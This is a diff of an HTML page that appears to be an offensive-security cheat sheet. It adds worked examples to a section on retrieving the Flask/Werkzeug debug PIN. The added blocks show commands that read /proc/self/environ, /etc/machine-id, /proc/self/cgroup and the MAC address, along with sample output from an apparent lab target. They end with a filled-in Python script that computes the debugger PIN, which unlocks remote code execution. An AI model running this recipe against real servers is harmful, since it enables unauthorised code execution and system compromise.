@@ -331,16 +331,46 @@ body.dark-mode #dynamicFormContainer button:hover {
   <h3 id="retrieve-flask-debug-pin">Retrieve Flask Debug Pin</h3>
 <h4 id="1-get-user">1. Get user</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cat /proc/self/environ | grep -aE (&#39;USER&#39;|&#39;LOGNAME&#39;)
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /proc/self/environ        
+</span></span><span class="line"><span class="cl"><span class="go">LANG=C.UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="go">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+</span></span></span><span class="line"><span class="cl"><span class="go">HOME=/var/www
+</span></span></span><span class="line"><span class="cl"><span class="go">LOGNAME=www-data
+</span></span></span><span class="line"><span class="cl"><span class="go">USER=www-data
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> cat /proc/self/environ <span class="p">|</span> grep -aE <span class="o">(</span><span class="s1">&#39;USER&#39;</span><span class="p">|</span><span class="s1">&#39;LOGNAME&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">LOGNAME=www-data
+</span></span></span><span class="line"><span class="cl"><span class="go">USER=www-data
 </span></span></span></code></pre></div><h4 id="2-get-full-path-of-the-application">2. Get full path of the application</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+------------------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| Get from Traceback debug log |
 </span></span></span><span class="line"><span class="cl"><span class="go">+------------------------------+
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Traceback (most recent call last)
+</span></span></span><span class="line"><span class="cl"><span class="go">    File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2528, in wsgi_app
+</span></span></span><span class="line"><span class="cl"><span class="go">    response = self.handle_exception(e)
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><h4 id="3-get-mac-address">3. Get MAC address</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cat /sys/class/net/eth0/address
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /sys/class/net/eth0/address
+</span></span><span class="line"><span class="cl"><span class="go">00:50:56:b9:2e:50
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Convert to int
 </span></span><span class="line"><span class="cl"><span class="go">python3 -c &#34;print(int(&#39;&lt;MAC_ADDRESS&gt;&#39;.replace(&#39;:&#39;,&#39;&#39;), 16))&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 -c <span class="s2">&#34;print(int(&#39;00:50:56:b9:2e:50&#39;.replace(&#39;:&#39;,&#39;&#39;), 16))&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="go">345052360272
 </span></span></span></code></pre></div><h4 id="4-create-machine-id-string">4. Create Machine ID String</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d &#39;/&#39; -f1 | rev)
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /etc/machine-id
+</span></span><span class="line"><span class="cl"><span class="go">ed5b159560f54721827644bc9b220d00
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> cat /proc/self/cgroup
+</span></span><span class="line"><span class="cl"><span class="go">0::/system.slice/superpass.service
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> head -n <span class="m">1</span> /proc/self/cgroup <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> rev
+</span></span><span class="line"><span class="cl"><span class="go">superpass.service
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>cat /etc/machine-id<span class="k">)$(</span>head -n <span class="m">1</span> /proc/self/cgroup <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> rev<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">ed5b159560f54721827644bc9b220d00superpass.service
 </span></span></span></code></pre></div><h4 id="5-update-public-and-private-bits-in-hacktricks-script">5. Update public and private bits in Hacktrick&rsquo;s Script</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl">
@@ -387,7 +417,52 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
-</span></span></code></pre></div>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>!/usr/bin/env python3
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">import hashlib
+</span></span></span><span class="line"><span class="cl"><span class="go">from itertools import chain
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">probably_public_bits = [
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;www-data&#39;,   # username
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;flask.app&#39;,  # modname (should be flask.app)
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;wsgi_app&#39;,   # Flask / wsgi_app / DebuggedApplication
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;  # full path of the app
+</span></span></span><span class="line"><span class="cl"><span class="go">]
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">private_bits = [
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;345052360272&#39;,                  # Mac address
+</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;ed5b159560f54721827644bc9b220d00superpass.service&#39;  # machine_id string
+</span></span></span><span class="line"><span class="cl"><span class="go">]
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">h = hashlib.sha1()
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">for bit in chain(probably_public_bits, private_bits):
+</span></span></span><span class="line"><span class="cl"><span class="go">    if not bit:
+</span></span></span><span class="line"><span class="cl"><span class="go">        continue
+</span></span></span><span class="line"><span class="cl"><span class="go">    if isinstance(bit, str):
+</span></span></span><span class="line"><span class="cl"><span class="go">        bit = bit.encode(&#39;utf-8&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="go">    h.update(bit)
+</span></span></span><span class="line"><span class="cl"><span class="go">h.update(b&#39;cookiesalt&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">num = None
+</span></span></span><span class="line"><span class="cl"><span class="go">if num is None:
+</span></span></span><span class="line"><span class="cl"><span class="go">    h.update(b&#39;pinsalt&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="go">    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">rv = None
+</span></span></span><span class="line"><span class="cl"><span class="go">if rv is None:
+</span></span></span><span class="line"><span class="cl"><span class="go">    for group_size in 5, 4, 3:
+</span></span></span><span class="line"><span class="cl"><span class="go">        if len(num) % group_size == 0:
+</span></span></span><span class="line"><span class="cl"><span class="go">            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="go">                          for x in range(0, len(num), group_size))
+</span></span></span><span class="line"><span class="cl"><span class="go">            break
+</span></span></span><span class="line"><span class="cl"><span class="go">    else:
+</span></span></span><span class="line"><span class="cl"><span class="go">        rv = num
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">print(rv)
+</span></span></span></code></pre></div>
 </div></div>
     
     <script type="module" src="/js/main.js"></script>
